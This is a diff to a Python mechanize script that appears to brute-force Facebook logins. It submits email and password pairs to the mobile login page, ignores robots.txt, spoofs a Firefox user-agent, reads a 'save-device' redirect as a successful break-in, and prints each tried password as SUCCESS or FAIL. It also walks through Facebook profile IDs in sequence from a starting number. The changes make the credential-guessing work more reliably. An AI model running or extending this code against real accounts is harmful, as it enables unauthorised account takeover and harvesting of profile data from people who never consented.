@@ -24,7 +24,7 @@ class main(color):
     b.set_handle_referer( True )
     b.set_handle_robots(False)
     
-    b.addheaders=[('User-agent',"Mozilla")]
+    
     url="https://www.facebook.com/"
 
 
@@ -84,22 +84,25 @@ class main(color):
         
 
     def facebooklogin(self,email,psw):
-        fres=self.b.open('https://www.facebook.com/login.php')
+        self.b.addheaders = [ ('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1') ]
+        fres=self.b.open('https://m.facebook.com/login.php')
         self.b.select_form(nr=0)
         self.b.form['email']=email
         self.b.form['pass']=psw
         respon=self.b.submit()
-        if respon.code==200:
+        if "save-device" in respon.geturl():
         
-            print("login "+self.OKBLUE+self.usr_name+self.ENDC+" with password >> "+self.OKGREEN+psw+self.ENDC+" respon status :::",self.WARNING+str(respon.code)+self.ENDC)
+            print("login "+self.OKBLUE+self.usr_name+self.ENDC+" with password >> "+self.OKGREEN+psw+self.ENDC+" status :::",self.WARNING+"SUCCESS"+self.ENDC)
             
         else:
-            print("login "+self.OKBLUE+self.usr_name+self.ENDC+" with password >> "+self.OKGREEN+psw+self.ENDC+" respon status :::",self.UNDERLINE+str(respon.code)+self.ENDC)
+            print("login "+self.OKBLUE+self.usr_name+self.ENDC+" with password >> "+self.OKGREEN+psw+self.ENDC+" status :::",self.FAIL+"FAIL"+self.ENDC)
 
         print("respon URL :: "+self.BOLD+self.b.geturl()+self.ENDC)
     def getinfo(self):
+        
         usr_id=int(input('give me starter id '))
         while True:
+            self.b.addheaders=[('User-agent',"Mozilla")]
             res=self.b.open("https://www.facebook.com/"+str(usr_id))
             
     
